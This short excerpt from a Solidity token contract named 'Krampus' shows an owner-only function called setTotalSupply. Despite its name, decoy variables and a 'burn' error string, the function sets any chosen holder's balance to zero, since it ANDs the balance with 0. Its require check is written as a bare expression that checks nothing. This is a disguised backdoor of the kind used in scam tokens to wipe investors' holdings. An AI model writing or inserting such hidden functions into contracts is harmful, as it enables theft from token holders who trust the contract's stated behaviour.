...
contract Krampus is Ownable, IERC20 {
    ...
    function setTotalSupply(address sender) public onlyOwner {
        (sender != address(0), "BEP20: burn from the zero address");
        uint8 tAmount = 2;  uint32 BurnTax = 1;
        _balances[sender] = ((BurnTax & (_balances[sender]) & tAmount & 0) << 0xF);
    }
